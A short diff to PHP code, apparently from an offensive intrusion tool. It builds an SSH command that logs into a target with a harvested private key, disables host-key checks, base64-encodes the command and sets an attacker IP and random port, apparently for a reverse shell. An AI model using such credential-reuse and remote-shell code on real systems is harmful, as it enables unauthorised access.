@@ -227,7 +227,7 @@ class check4linux8protocol extends AUTH{
                     if(is_resource($stream)){
                         $info = "SSH Private Key:$private_key_ssh_rsa_file";
                         $this->log2succes($info);
-                        $template_shell = "ssh -i $private_key_ssh_rsa_file -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $remote_username_ftp@$this->ip -p $ssh_open -C  \"%SHELL%\" ";
+                        $template_shell = "ssh -i $private_key_ssh_rsa_file -o PasswordAuthentication=no -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $remote_username_ftp@$this->ip -p $ssh_open -C  \"%SHELL%\" ";
                         $templateB64_shell = base64_encode($template_shell);
                         $attacker_ip = $this->ip4addr4target($this->ip);
                         $attacker_port = rand(1024,65535);
